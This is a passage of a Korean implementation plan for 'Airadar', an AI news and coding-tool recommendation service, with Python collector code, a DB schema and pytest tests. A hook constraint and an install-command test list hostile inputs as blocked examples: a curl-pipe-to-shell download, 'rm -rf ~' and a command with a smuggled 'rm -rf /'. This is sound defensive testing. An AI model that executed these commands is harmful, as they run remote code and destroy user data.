# Airadar Implementation Plan

> **For agentic workers:** 이 계획은 `airadar-orchestrator` 스킬로 실행한다 (태스크마다 담당 개발 에이전트 → qa-inspector). Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** AI 뉴스와 AI 코딩 도구(플러그인·스킬·MCP 서버 등) 추천을 한국어 요약과 함께 보여 주는 웹 서비스 MVP를 만든다.

**Architecture:** GitHub Actions 크론이 Python 수집기를 실행해 뉴스·레포를 수집하고, LLM으로 요약해 Neon Postgres에 저장한다. Next.js(Vercel)가 DB를 직접 읽어 렌더링한다. 백엔드 서버는 없다.

**Tech Stack:** Python 3.12 + uv, httpx, feedparser, psycopg 3, pydantic 2, pytest / Next.js(App Router) + TypeScript + Tailwind, @neondatabase/serverless / GitHub Actions

**Spec:** `docs/superpowers/specs/2026-09-25-airadar-design.md`

## Global Constraints
- 비용 0원 지향: 무료 호스팅만 사용한다. 유료 비용은 LLM 호출뿐이고, 실행당 `LLM_MAX_CALLS`(기본 60)로 상한을 둔다.
- LLM 선택: `LLM_PROVIDER=claude|gemini|openai`, `LLM_API_KEY`, `LLM_MODEL`(claude는 선택, 나머지는 필수). 기본값은 claude `claude-haiku-4-5-20251001`
- 뉴스 소스: AI 기업 공식 블로그 RSS, Hacker News(AI 키워드), GeekNews(AI 키워드)
- 추천 범위: Claude Code 플러그인·스킬, MCP 서버, Cursor 규칙, 에이전트 프레임워크
- 설치 명령은 허용 패턴만 저장한다: `/plugin marketplace add`, `/plugin install`, `claude mcp add`, `npx`, `uvx`, `pip install`, `npm install`, `git clone https://github.com/...`
- archived 레포와 90일 이상 push가 없는 레포는 제외한다
- 범위 밖: 로그인, 북마크, 다이제스트, 모델 트래커, 논문, 방문자 BYOK, FastAPI
- UI 문구는 한국어로 쓴다. 비밀값은 환경 변수로만 읽는다.
- Hook(`.claude/settings.json`): `collector/`의 `.py`는 그 모듈 이름을 참조하는 테스트가 `collector/tests/`에 있어야 수정할 수 있다(TDD Guard). `rm -rf`, `git push --force`, `git reset --hard`, `DROP TABLE`은 차단된다. 응답을 마칠 때 collector pytest가 실패하면 계속 고치게 된다.
- 로컬 선행 조건: `uv`, Node 20+ 설치. DB 테스트는 `TEST_DATABASE_URL`(Neon 브랜치 DB)이 있을 때만 실행되고, 없으면 skip된다.

## Review Focus
1. LLM이 JSON을 코드펜스(```json)로 감싸거나 앞뒤에 말을 붙여 반환 → 그래도 파싱돼야 한다 (Task 2 테스트)
2. LLM이 `curl ... | sh`, `rm -rf`, `pip install x>1`(리다이렉트) 같은 명령을 제안 → 저장되면 안 된다 (Task 4 테스트)
3. RSS 항목에 날짜나 링크가 없음 → 날짜는 NULL로 저장해 목록 끝으로 정렬하고, 링크가 없으면 건너뛴다 (Task 3 테스트)
4. 같은 URL이 두 소스에 등장(HN이 OpenAI 블로그를 링크) → 한 번만 저장된다 (Task 1 DB 테스트)
5. 같은 레포가 여러 토픽 검색에 중복 등장 → 한 번만 처리된다 (Task 5 테스트)

---

## 파일 구조
```
Airadar/
├─ .gitignore
├─ README.md                       # T7: 로컬 실행·배포 방법
├─ db/schema.sql                   # T1: 수집기와 웹이 공유하는 계약
├─ collector/
│  ├─ pyproject.toml               # T1
│  ├─ __init__.py
│  ├─ db.py                        # T1: SQL 전부
│  ├─ llm/__init__.py, base.py     # T2: Provider, 파싱, get_provider, max_calls
│  ├─ llm/claude.py, gemini.py, openai_provider.py   # T2
│  ├─ sources/__init__.py, keywords.py, rss.py, hackernews.py, geeknews.py   # T3
│  ├─ run_news.py                  # T3
│  ├─ install_cmd.py, scoring.py   # T4
│  ├─ sources/github.py, run_repos.py   # T5
│  └─ tests/ test_db.py, test_llm.py, test_sources.py, test_run_news.py, test_install_cmd.py, test_scoring.py, test_github.py
├─ web/                            # T6
│  ├─ lib/types.ts, lib/db.ts
│  ├─ components/ NewsList.tsx, RepoCard.tsx, RepoList.tsx, CopyButton.tsx, FilterLinks.tsx
│  └─ app/ layout.tsx, page.tsx, news/page.tsx, tools/page.tsx, trending/page.tsx
└─ .github/workflows/ collect-news.yml, collect-repos.yml   # T7
```
(`llm/openai.py`로 이름 지으면 `openai` SDK import와 헷갈리므로 `openai_provider.py`로 한다.)

---

### Task 1: 프로젝트 골격 + DB 스키마 + db.py
**담당:** collector-dev

**Files:**
- Create: `.gitignore`, `db/schema.sql`, `collector/pyproject.toml`, `collector/__init__.py`, `collector/db.py`
- Test: `collector/tests/test_db.py`

**Interfaces:**
- Produces (`collector/db.py`):
  - `connect(url: str | None = None) -> psycopg.Connection` (dict_row, autocommit)
  - `apply_schema(conn) -> None`
  - `upsert_news(conn, items: list[dict]) -> int` (새로 들어간 개수)
  - `news_without_summary(conn, limit: int) -> list[dict]` (id, title, excerpt)
  - `set_news_summary(conn, news_id: int, summary: str) -> None`
  - `upsert_repo(conn, r: dict) -> int` (repo id)
  - `save_snapshot(conn, repo_id: int, stars: int, day: date) -> None`
  - `stars_days_ago(conn, repo_id: int, today: date, days: int = 7) -> int | None`
  - `update_repo_score(conn, repo_id: int, score: float, weekly_delta: int | None) -> None`
  - `top_repos(conn, limit: int) -> list[dict]` (id, full_name, description, readme_hash)
  - `set_repo_llm(conn, repo_id, readme_hash, category, summary_ko, install_commands: list[str]) -> None`
- 뉴스 dict 키: `source, url, title, published_at, excerpt, lang`
- 레포 dict 키: `full_name, description, url, stars, pushed_at, topics`

- [ ] **Step 1: git 초기화와 .gitignore**

```bash
git init
```
`.gitignore`:
```
.env*
__pycache__/
.venv/
.pytest_cache/
node_modules/
.next/
_workspace*/
```

- [ ] **Step 2: 스키마 작성** — `db/schema.sql`

```sql
CREATE TABLE IF NOT EXISTS news_items (
  id           BIGSERIAL PRIMARY KEY,
  source       TEXT NOT NULL,
  url          TEXT NOT NULL UNIQUE,
  title        TEXT NOT NULL,
  published_at TIMESTAMPTZ,
  excerpt      TEXT,
  lang         TEXT NOT NULL DEFAULT 'en',
  summary_ko   TEXT,
  created_at   TIMESTAMPTZ NOT NULL DEFAULT now()
);
CREATE INDEX IF NOT EXISTS news_items_published_idx ON news_items (published_at DESC);

CREATE TABLE IF NOT EXISTS repos (
  id                BIGSERIAL PRIMARY KEY,
  full_name         TEXT NOT NULL UNIQUE,
  description       TEXT,
  url               TEXT NOT NULL,
  category          TEXT,
  stars             INTEGER NOT NULL DEFAULT 0,
  pushed_at         TIMESTAMPTZ,
  topics            TEXT[] NOT NULL DEFAULT '{}',
  readme_hash       TEXT,
  summary_ko        TEXT,
  install_commands  JSONB NOT NULL DEFAULT '[]',
  score             DOUBLE PRECISION NOT NULL DEFAULT 0,
  weekly_star_delta INTEGER,
  updated_at        TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS repo_star_snapshots (
  repo_id BIGINT NOT NULL REFERENCES repos(id) ON DELETE CASCADE,
  date    DATE NOT NULL,
  stars   INTEGER NOT NULL,
  PRIMARY KEY (repo_id, date)
);
```
(스펙 대비 `weekly_star_delta` 컬럼을 추가했다. 웹이 스냅샷을 다시 계산하지 않고 바로 정렬할 수 있게 하기 위해서다. NULL이면 "집계 중"이다.)

- [ ] **Step 3: pyproject 작성** — `collector/pyproject.toml`, 빈 `collector/__init__.py`

```toml
[project]
name = "airadar-collector"
version = "0.1.0"
requires-python = ">=3.12"
dependencies = ["httpx>=0.27", "feedparser>=6.0", "psycopg[binary]>=3.2", "pydantic>=2.7"]

[project.optional-dependencies]
claude = ["anthropic>=0.40"]
gemini = ["google-genai>=1.0"]
openai = ["openai>=1.50"]

[dependency-groups]
dev = ["pytest>=8"]

[tool.uv]
package = false

[tool.pytest.ini_options]
pythonpath = [".."]
testpaths = ["tests"]
```
Run: `cd collector && uv sync --all-extras`

- [ ] **Step 4: 실패하는 테스트 작성** — `collector/tests/test_db.py`

```python
import os
from datetime import date, datetime, timezone

import pytest

from collector import db

URL = os.environ.get("TEST_DATABASE_URL")
pytestmark = pytest.mark.skipif(not URL, reason="TEST_DATABASE_URL not set")


@pytest.fixture
def conn():
    c = db.connect(URL)
    c.execute("DROP TABLE IF EXISTS repo_star_snapshots, repos, news_items")
    db.apply_schema(c)
    yield c
    c.close()


def news(**kw):
    base = {"source": "hackernews", "url": "https://example.com/a", "title": "A",
            "published_at": None, "excerpt": None, "lang": "en"}
    return base | kw


def test_upsert_news_stores_same_url_once(conn):
    assert db.upsert_news(conn, [news(), news(source="openai")]) == 1


def test_news_without_summary_then_set(conn):
    db.upsert_news(conn, [news()])
    [row] = db.news_without_summary(conn, 10)
    db.set_news_summary(conn, row["id"], "요약")
    assert db.news_without_summary(conn, 10) == []


def repo(**kw):
    base = {"full_name": "o/r", "description": None, "url": "https://github.com/o/r",
            "stars": 10, "pushed_at": datetime.now(timezone.utc), "topics": ["mcp-server"]}
    return base | kw


def test_upsert_repo_updates_existing(conn):
    rid = db.upsert_repo(conn, repo())
    assert db.upsert_repo(conn, repo(stars=20)) == rid


def test_stars_days_ago(conn):
    rid = db.upsert_repo(conn, repo())
    db.save_snapshot(conn, rid, 10, date(2026, 9, 1))
    assert db.stars_days_ago(conn, rid, date(2026, 9, 5)) is None
    assert db.stars_days_ago(conn, rid, date(2026, 9, 8)) == 10


def test_top_repos_and_set_llm(conn):
    rid = db.upsert_repo(conn, repo())
    db.update_repo_score(conn, rid, 5.0, None)
    db.set_repo_llm(conn, rid, "h", "mcp-server", "요약", ["npx -y x"])
    [row] = db.top_repos(conn, 10)
    assert row["readme_hash"] == "h"
```

- [ ] **Step 5: 실패 확인**

Run: `cd collector && uv run pytest tests/test_db.py -v`
Expected: FAIL (`ImportError: cannot import name 'db'`)

- [ ] **Step 6: 구현** — `collector/db.py`

```python
import os
from datetime import date, timedelta
from pathlib import Path

import psycopg
from psycopg.rows import dict_row
from psycopg.types.json import Jsonb

SCHEMA = Path(__file__).resolve().parent.parent / "db" / "schema.sql"


def connect(url: str | None = None) -> psycopg.Connection:
    return psycopg.connect(url or os.environ["DATABASE_URL"], row_factory=dict_row, autocommit=True)


def apply_schema(conn) -> None:
    conn.execute(SCHEMA.read_text(encoding="utf-8"))


def upsert_news(conn, items: list[dict]) -> int:
    inserted = 0
    for item in items:
        cur = conn.execute(
            """INSERT INTO news_items (source, url, title, published_at, excerpt, lang)
               VALUES (%(source)s, %(url)s, %(title)s, %(published_at)s, %(excerpt)s, %(lang)s)
               ON CONFLICT (url) DO NOTHING""",
            item,
        )
        inserted += cur.rowcount
    return inserted


def news_without_summary(conn, limit: int) -> list[dict]:
    return conn.execute(
        """SELECT id, title, excerpt FROM news_items WHERE summary_ko IS NULL
           ORDER BY published_at DESC NULLS LAST LIMIT %s""",
        (limit,),
    ).fetchall()


def set_news_summary(conn, news_id: int, summary: str) -> None:
    conn.execute("UPDATE news_items SET summary_ko = %s WHERE id = %s", (summary, news_id))


def upsert_repo(conn, r: dict) -> int:
    row = conn.execute(
        """INSERT INTO repos (full_name, description, url, stars, pushed_at, topics)
           VALUES (%(full_name)s, %(description)s, %(url)s, %(stars)s, %(pushed_at)s, %(topics)s)
           ON CONFLICT (full_name) DO UPDATE SET
             description = EXCLUDED.description, url = EXCLUDED.url, stars = EXCLUDED.stars,
             pushed_at = EXCLUDED.pushed_at, topics = EXCLUDED.topics, updated_at = now()
           RETURNING id""",
        r,
    ).fetchone()
    return row["id"]


def save_snapshot(conn, repo_id: int, stars: int, day: date) -> None:
    conn.execute(
        """INSERT INTO repo_star_snapshots (repo_id, date, stars) VALUES (%s, %s, %s)
           ON CONFLICT (repo_id, date) DO UPDATE SET stars = EXCLUDED.stars""",
        (repo_id, day, stars),
    )


def stars_days_ago(conn, repo_id: int, today: date, days: int = 7) -> int | None:
    row = conn.execute(
        """SELECT stars FROM repo_star_snapshots WHERE repo_id = %s AND date <= %s
           ORDER BY date DESC LIMIT 1""",
        (repo_id, today - timedelta(days=days)),
    ).fetchone()
    return row["stars"] if row else None


def update_repo_score(conn, repo_id: int, score: float, weekly_delta: int | None) -> None:
    conn.execute(
        "UPDATE repos SET score = %s, weekly_star_delta = %s WHERE id = %s",
        (score, weekly_delta, repo_id),
    )


def top_repos(conn, limit: int) -> list[dict]:
    return conn.execute(
        """SELECT id, full_name, description, readme_hash FROM repos
           WHERE pushed_at >= now() - interval '90 days'
           ORDER BY score DESC LIMIT %s""",
        (limit,),
    ).fetchall()


def set_repo_llm(conn, repo_id: int, readme_hash: str, category: str,
                 summary_ko: str, install_commands: list[str]) -> None:
    conn.execute(
        """UPDATE repos SET readme_hash = %s, category = %s, summary_ko = %s, install_commands = %s
           WHERE id = %s""",
        (readme_hash, category, summary_ko, Jsonb(install_commands), repo_id),
    )
```

- [ ] **Step 7: 통과 확인**

Run: `cd collector && uv run pytest tests/test_db.py -v`
Expected: `TEST_DATABASE_URL`이 있으면 5 passed, 없으면 5 skipped (import 오류 없음)

- [ ] **Step 8: Commit**

```bash
git add .gitignore db collector docs .claude CLAUDE.md
git commit -m "feat: add db schema and collector db layer"
```

---

### Task 2: LLM Provider
**담당:** collector-dev

**Files:**
- Create: `collector/llm/__init__.py`(빈 파일), `collector/llm/base.py`, `collector/llm/claude.py`, `collector/llm/gemini.py`, `collector/llm/openai_provider.py`
- Test: `collector/tests/test_llm.py`

**Interfaces:**
- Produces (`collector/llm/base.py`):
  - `class Provider`: `complete(prompt: str) -> str` (구현체가 오버라이드), `summarize(text: str, kind: "news" | "repo") -> dict | None`
  - news 결과: `{"summary_ko": str}` / repo 결과: `{"category": str, "summary_ko": str, "install_commands": list[str]}`
  - `parse_output(raw: str, kind) -> dict | None`
  - `get_provider() -> Provider | None` (키가 없으면 None)
  - `max_calls() -> int` (`LLM_MAX_CALLS`, 기본 60)
  - `CATEGORIES`: `claude-code-plugin, skill, mcp-server, cursor-rules, agent-framework, other`

- [ ] **Step 1: 실패하는 테스트 작성** — `collector/tests/test_llm.py`

```python
import pytest

from collector.llm.base import Provider, get_provider, max_calls, parse_output
from collector.llm.claude import ClaudeProvider
from collector.llm.gemini import GeminiProvider
from collector.llm.openai_provider import OpenAIProvider


class FakeProvider(Provider):
    def __init__(self, raw):
        self.raw = raw

    def complete(self, prompt):
        return self.raw


def test_parse_plain_json():
    assert parse_output('{"summary_ko": "요약"}', "news") == {"summary_ko": "요약"}


def test_parse_json_in_code_fence_with_chatter():
    raw = '결과입니다:\n```json\n{"category": "mcp-server", "summary_ko": "s", "install_commands": ["npx -y x"]}\n```'
    assert parse_output(raw, "repo") == {"category": "mcp-server", "summary_ko": "s", "install_commands": ["npx -y x"]}


def test_parse_rejects_unknown_category():
    assert parse_output('{"category": "game", "summary_ko": "s"}', "repo") is None


def test_parse_rejects_garbage():
    assert parse_output("죄송합니다", "news") is None
    assert parse_output('{"summary_ko": ""}', "news") is None


def test_summarize_uses_complete():
    assert FakeProvider('{"summary_ko": "요약"}').summarize("text", "news") == {"summary_ko": "요약"}


def test_summarize_returns_none_on_api_error():
    class Boom(Provider):
        def complete(self, prompt):
            raise RuntimeError("rate limited")

    assert Boom().summarize("text", "news") is None


def test_get_provider_without_key(monkeypatch):
    monkeypatch.delenv("LLM_API_KEY", raising=False)
    assert get_provider() is None


def test_get_provider_unknown_name(monkeypatch):
    monkeypatch.setenv("LLM_API_KEY", "k")
    monkeypatch.setenv("LLM_PROVIDER", "nope")
    with pytest.raises(ValueError):
        get_provider()


def test_get_provider_requires_model_for_openai(monkeypatch):
    monkeypatch.setenv("LLM_API_KEY", "k")
    monkeypatch.setenv("LLM_PROVIDER", "openai")
    monkeypatch.delenv("LLM_MODEL", raising=False)
    with pytest.raises(ValueError):
        get_provider()


def test_max_calls_default(monkeypatch):
    monkeypatch.delenv("LLM_MAX_CALLS", raising=False)
    assert max_calls() == 60


@pytest.mark.parametrize("name, cls", [
    ("claude", ClaudeProvider), ("gemini", GeminiProvider), ("openai", OpenAIProvider),
])
def test_get_provider_selects_implementation(monkeypatch, name, cls):
    monkeypatch.setenv("LLM_API_KEY", "k")
    monkeypatch.setenv("LLM_PROVIDER", name)
    monkeypatch.setenv("LLM_MODEL", "m")
    assert isinstance(get_provider(), cls)  # SDK 클라이언트 생성만 하므로 네트워크를 쓰지 않는다
```

- [ ] **Step 2: 실패 확인**

Run: `cd collector && uv run pytest tests/test_llm.py -v`
Expected: FAIL (`ModuleNotFoundError: collector.llm`)

- [ ] **Step 3: 구현** — `collector/llm/base.py`

```python
import json
import logging
import os
import re
from typing import Literal

from pydantic import BaseModel, Field, ValidationError

log = logging.getLogger("airadar.llm")

Kind = Literal["news", "repo"]
CATEGORIES = ("claude-code-plugin", "skill", "mcp-server", "cursor-rules", "agent-framework", "other")


class NewsSummary(BaseModel):
    summary_ko: str = Field(min_length=1)


class RepoSummary(BaseModel):
    category: Literal[CATEGORIES]
    summary_ko: str = Field(min_length=1)
    install_commands: list[str] = []


MODELS = {"news": NewsSummary, "repo": RepoSummary}

PROMPTS = {
    "news": (
        "다음 AI 뉴스를 한국어로 요약하라. 주어진 내용만 사용하고 추측하지 마라. "
        "내용이 충분하면 3줄, 제목뿐이면 제목을 자연스러운 한국어 한 줄로 옮겨라.\n"
        'JSON만 출력: {"summary_ko": "..."}\n\n'
    ),
    "repo": (
        "다음 GitHub 저장소 정보를 읽고 JSON만 출력하라.\n"
        '{"category": "claude-code-plugin|skill|mcp-server|cursor-rules|agent-framework|other 중 하나", '
        '"summary_ko": "무엇이고 누가 쓰면 좋은지 한국어 3줄", '
        '"install_commands": ["README에 실제로 적힌 설치 명령만, 최대 3개. 없으면 빈 배열"]}\n\n'
    ),
}

_JSON = re.compile(r"\{.*\}", re.DOTALL)


def parse_output(raw: str, kind: Kind) -> dict | None:
    match = _JSON.search(raw or "")
    if not match:
        return None
    try:
        return MODELS[kind].model_validate(json.loads(match.group(0))).model_dump()
    except (json.JSONDecodeError, ValidationError):
        return None


class Provider:
    def complete(self, prompt: str) -> str:
        raise NotImplementedError

    def summarize(self, text: str, kind: Kind) -> dict | None:
        try:
            raw = self.complete(PROMPTS[kind] + text[:8000])
        except Exception as e:
            log.warning("LLM call failed: %s", e)
            return None
        return parse_output(raw, kind)


def get_provider() -> Provider | None:
    key = os.environ.get("LLM_API_KEY")
    if not key:
        return None
    name = os.environ.get("LLM_PROVIDER") or "claude"
    model = os.environ.get("LLM_MODEL") or None
    if name == "claude":
        from .claude import ClaudeProvider
        return ClaudeProvider(key, model)
    if name in ("gemini", "openai") and not model:
        raise ValueError(f"LLM_MODEL is required for LLM_PROVIDER={name}")
    if name == "gemini":
        from .gemini import GeminiProvider
        return GeminiProvider(key, model)
    if name == "openai":
        from .openai_provider import OpenAIProvider
        return OpenAIProvider(key, model)
    raise ValueError(f"unknown LLM_PROVIDER: {name}")


def max_calls() -> int:
    return int(os.environ.get("LLM_MAX_CALLS") or 60)
```

`collector/llm/claude.py`:
```python
from .base import Provider

DEFAULT_MODEL = "claude-haiku-4-5-20251001"


class ClaudeProvider(Provider):
    def __init__(self, api_key: str, model: str | None = None):
        import anthropic

        self.client = anthropic.Anthropic(api_key=api_key)
        self.model = model or DEFAULT_MODEL

    def complete(self, prompt: str) -> str:
        resp = self.client.messages.create(
            model=self.model, max_tokens=1024, messages=[{"role": "user", "content": prompt}]
        )
        return resp.content[0].text
```

`collector/llm/gemini.py`:
```python
from .base import Provider


class GeminiProvider(Provider):
    def __init__(self, api_key: str, model: str):
        from google import genai

        self.client = genai.Client(api_key=api_key)
        self.model = model

    def complete(self, prompt: str) -> str:
        return self.client.models.generate_content(model=self.model, contents=prompt).text or ""
```

`collector/llm/openai_provider.py`:
```python
from .base import Provider


class OpenAIProvider(Provider):
    def __init__(self, api_key: str, model: str):
        from openai import OpenAI

        self.client = OpenAI(api_key=api_key)
        self.model = model

    def complete(self, prompt: str) -> str:
        resp = self.client.chat.completions.create(
            model=self.model, messages=[{"role": "user", "content": prompt}]
        )
        return resp.choices[0].message.content or ""
```

- [ ] **Step 4: 통과 확인**

Run: `cd collector && uv run pytest tests/test_llm.py -v`
Expected: 13 passed

- [ ] **Step 5: Commit**

```bash
git add collector/llm collector/tests/test_llm.py
git commit -m "feat: add switchable LLM provider with validated JSON output"
```

---

### Task 3: 뉴스 소스 + run_news
**담당:** collector-dev

**Files:**
- Create: `collector/sources/__init__.py`(빈 파일), `collector/sources/keywords.py`, `collector/sources/rss.py`, `collector/sources/hackernews.py`, `collector/sources/geeknews.py`, `collector/run_news.py`
- Test: `collector/tests/test_sources.py`, `collector/tests/test_run_news.py`

**Interfaces:**
- Consumes: `db.connect/apply_schema/upsert_news/news_without_summary/set_news_summary` (T1), `get_provider/max_calls` (T2)
- Produces: `rss.parse(xml, source, lang="en") -> list[dict]`, `rss.get(url) -> bytes`, `hackernews.parse(data: dict) -> list[dict]`, `geeknews.parse(xml) -> list[dict]`, `keywords.is_ai(text) -> bool`, 각 모듈의 `fetch() -> list[dict]`, `run_news.collect() -> list[dict]`

- [ ] **Step 1: RSS 주소 확인** — 아래 주소가 200을 반환하는지 확인하고, 실패한 주소는 `FEEDS`에서 뺀다. Anthropic은 공식 RSS가 없어서 MVP에서는 제외한다.

```bash
for u in https://openai.com/news/rss.xml https://deepmind.google/blog/rss.xml https://huggingface.co/blog/feed.xml https://blog.google/technology/ai/rss/ https://news.hada.io/rss/news; do curl -s -o /dev/null -w "%{http_code} $u\n" -L -A airadar "$u"; done
```

- [ ] **Step 2: 실패하는 테스트 작성** — `collector/tests/test_sources.py`

```python
from collector.sources import geeknews, hackernews, rss
from collector.sources.keywords import is_ai

RSS = """<?xml version="1.0"?><rss version="2.0"><channel><title>t</title>
<item><title>Introducing &lt;b&gt;GPT&lt;/b&gt; X</title><link>https://openai.com/a</link>
<description>&lt;p&gt;New model&lt;/p&gt;</description><pubDate>Wed, 24 Sep 2026 10:00:00 GMT</pubDate></item>
<item><title>No date</title><link>https://openai.com/b</link></item>
<item><title>No link</title></item>
</channel></rss>"""

GEEK = """<?xml version="1.0"?><rss version="2.0"><channel><title>g</title>
<item><title>OpenAI가 새 에이전트 공개</title><link>https://news.hada.io/topic?id=1</link></item>
<item><title>Rust 1.90 릴리스</title><link>https://news.hada.io/topic?id=2</link></item>
</channel></rss>"""


def test_rss_parse_cleans_html_and_handles_missing_fields():
    items = rss.parse(RSS, "openai")
    assert [i["url"] for i in items] == ["https://openai.com/a", "https://openai.com/b"]
    assert items[0]["title"] == "Introducing GPT X"
    assert items[0]["excerpt"] == "New model"
    assert items[0]["published_at"].year == 2026
    assert items[1]["published_at"] is None and items[1]["excerpt"] is None
    assert items[0]["lang"] == "en"


def test_is_ai():
    assert is_ai("Show HN: an LLM tool")
    assert is_ai("OpenAI가 새 모델 공개")
    assert is_ai("구글, 인공지능 발표")
    assert not is_ai("Said the email")
    assert not is_ai("Rust 1.90 released")


def test_geeknews_keeps_only_ai_items_in_korean():
    items = geeknews.parse(GEEK)
    assert [i["title"] for i in items] == ["OpenAI가 새 에이전트 공개"]
    assert items[0]["lang"] == "ko" and items[0]["source"] == "geeknews"


def test_hackernews_parse_filters_and_falls_back_to_item_url():
    data = {"hits": [
        {"objectID": "1", "title": "Claude 5 is out", "url": None, "created_at_i": 1790000000},
        {"objectID": "2", "title": "Postgres tips", "url": "https://x.com", "created_at_i": 1790000000},
    ]}
    [item] = hackernews.parse(data)
    assert item["url"] == "https://news.ycombinator.com/item?id=1"
    assert item["source"] == "hackernews" and item["excerpt"] is None
```

`collector/tests/test_run_news.py`:
```python
import pytest

from collector import run_news


def boom():
    raise RuntimeError("down")


def test_collect_continues_when_one_source_fails(monkeypatch):
    monkeypatch.setattr(run_news, "SOURCES", {"a": boom, "b": lambda: [{"url": "u"}]})
    assert run_news.collect() == [{"url": "u"}]


def test_collect_exits_when_all_sources_fail(monkeypatch):
    monkeypatch.setattr(run_news, "SOURCES", {"a": boom})
    with pytest.raises(SystemExit):
        run_news.collect()
```

- [ ] **Step 3: 실패 확인**

Run: `cd collector && uv run pytest tests/test_sources.py tests/test_run_news.py -v`
Expected: FAIL (`ModuleNotFoundError: collector.sources`)

- [ ] **Step 4: 구현**

`collector/sources/keywords.py` (영문 키워드 뒤에 한글 조사가 붙어도 잡히도록 `\b` 대신 영문자 경계를 쓴다):
```python
import re

_EN = re.compile(
    r"(?<![A-Za-z])(ai|llms?|gpt|claude|gemini|openai|anthropic|agents?|agentic|mcp|rag|"
    r"transformers?|diffusion|copilot|chatbots?|deepmind|hugging ?face)(?![A-Za-z])",
    re.IGNORECASE,
)
_KO = ("인공지능", "에이전트", "머신러닝", "딥러닝", "언어모델", "언어 모델")


def is_ai(text: str) -> bool:
    return bool(_EN.search(text)) or any(k in text for k in _KO)
```

`collector/sources/rss.py`:
```python
import html
import logging
import re
from datetime import datetime, timezone

import feedparser
import httpx

log = logging.getLogger("airadar.rss")

FEEDS = {
    "openai": "https://openai.com/news/rss.xml",
    "deepmind": "https://deepmind.google/blog/rss.xml",
    "huggingface": "https://huggingface.co/blog/feed.xml",
    "google-ai": "https://blog.google/technology/ai/rss/",
}
_TAG = re.compile(r"<[^>]+>")


def _clean(s: str | None) -> str:
    return html.unescape(_TAG.sub("", s or "")).strip()


def _date(entry) -> datetime | None:
    t = entry.get("published_parsed") or entry.get("updated_parsed")
    return datetime(*t[:6], tzinfo=timezone.utc) if t else None


def parse(xml: bytes | str, source: str, lang: str = "en") -> list[dict]:
    items = []
    for e in feedparser.parse(xml).entries:
        url, title = e.get("link"), _clean(e.get("title"))
        if not url or not title:
            continue
        items.append({"source": source, "url": url, "title": title, "published_at": _date(e),
                      "excerpt": _clean(e.get("summary"))[:500] or None, "lang": lang})
    return items


def get(url: str) -> bytes:
    r = httpx.get(url, timeout=20, follow_redirects=True, headers={"User-Agent": "airadar/0.1"})
    r.raise_for_status()
    return r.content


def fetch() -> list[dict]:
    items = []
    for source, url in FEEDS.items():
        try:
            items += parse(get(url), source)
        except httpx.HTTPError as e:
            log.warning("feed %s failed: %s", source, e)
    return items
```

`collector/sources/geeknews.py`:
```python
from . import rss
from .keywords import is_ai

URL = "https://news.hada.io/rss/news"


def parse(xml: bytes | str) -> list[dict]:
    return [i for i in rss.parse(xml, "geeknews", lang="ko")
            if is_ai(f"{i['title']} {i['excerpt'] or ''}")]


def fetch() -> list[dict]:
    return parse(rss.get(URL))
```

`collector/sources/hackernews.py`:
```python
import time
from datetime import datetime, timezone

import httpx

from .keywords import is_ai

ALGOLIA = "https://hn.algolia.com/api/v1/search_by_date"


def parse(data: dict) -> list[dict]:
    items = []
    for h in data.get("hits", []):
        title = h.get("title") or ""
        if not is_ai(title):
            continue
        items.append({
            "source": "hackernews",
            "url": h.get("url") or f"https://news.ycombinator.com/item?id={h['objectID']}",
            "title": title,
            "published_at": datetime.fromtimestamp(h["created_at_i"], tz=timezone.utc),
            "excerpt": None,
            "lang": "en",
        })
    return items


def fetch() -> list[dict]:
    since = int(time.time()) - 86400
    r = httpx.get(ALGOLIA, timeout=20, params={
        "tags": "story", "numericFilters": f"created_at_i>{since},points>=50", "hitsPerPage": 100,
    })
    r.raise_for_status()
    return parse(r.json())
```

`collector/run_news.py`:
```python
import logging

from collector import db
from collector.llm.base import get_provider, max_calls
from collector.sources import geeknews, hackernews, rss

log = logging.getLogger("airadar.news")

SOURCES = {"rss": rss.fetch, "hackernews": hackernews.fetch, "geeknews": geeknews.fetch}


def collect() -> list[dict]:
    items, failed = [], 0
    for name, fetch in SOURCES.items():
        try:
            got = fetch()
            items += got
            log.info("%s: %d items", name, len(got))
        except Exception:
            failed += 1
            log.exception("%s failed", name)
    if failed == len(SOURCES):
        raise SystemExit(1)
    return items


def main() -> None:
    logging.basicConfig(level=logging.INFO)
    items = collect()
    provider = get_provider()
    with db.connect() as conn:
        db.apply_schema(conn)
        log.info("inserted %d new items", db.upsert_news(conn, items))
        if provider is None:
            log.info("LLM_API_KEY not set; skipping summaries")
            return
        done = 0
        for row in db.news_without_summary(conn, max_calls()):
            result = provider.summarize(f"{row['title']}\n\n{row['excerpt'] or ''}", "news")
            if result:
                db.set_news_summary(conn, row["id"], result["summary_ko"])
                done += 1
        log.info("summarized %d items", done)


if __name__ == "__main__":
    main()
```

- [ ] **Step 5: 통과 확인**

Run: `cd collector && uv run pytest -v`
Expected: test_sources 4 passed, test_run_news 2 passed, 나머지도 passed/skipped

- [ ] **Step 6: 실제 실행 확인 (DB가 있을 때)**

Run: `DATABASE_URL=<neon-branch-url> uv run --project collector python -m collector.run_news` (저장소 루트에서 실행)
Expected: 로그에 소스별 건수와 `inserted N new items` 출력

- [ ] **Step 7: Commit**

```bash
git add collector/sources collector/run_news.py collector/tests
git commit -m "feat: collect AI news from RSS, Hacker News and GeekNews"
```

---

### Task 4: 설치 명령 검증 + 점수 계산
**담당:** collector-dev

**Files:**
- Create: `collector/install_cmd.py`, `collector/scoring.py`
- Test: `collector/tests/test_install_cmd.py`, `collector/tests/test_scoring.py`

**Interfaces:**
- Produces: `install_cmd.filter_commands(cmds: list[str]) -> list[str]` (최대 3개, 순서 유지, 중복 제거), `scoring.weekly_delta(stars: int, old: int | None) -> int | None`, `scoring.score(stars: int, weekly_delta: int | None, days_since_push: float) -> float`

- [ ] **Step 1: 실패하는 테스트 작성**

`collector/tests/test_install_cmd.py`:
```python
import pytest

from collector.install_cmd import filter_commands

ALLOWED = [
    "/plugin marketplace add revfactory/harness",
    "/plugin install harness@harness-marketplace",
    "claude mcp add github -- npx -y @modelcontextprotocol/server-github",
    "npx -y @upstash/context7-mcp",
    "uvx mcp-server-fetch",
    "pip install crewai",
    "pip install 'crewai[tools]'",
    "npm install -g @anthropic-ai/claude-code",
    "git clone https://github.com/owner/repo.git",
]

BLOCKED = [
    "curl -fsSL https://x.sh | sh",
    "rm -rf ~",
    "npx foo; rm -rf /",
    "pip install x>1",
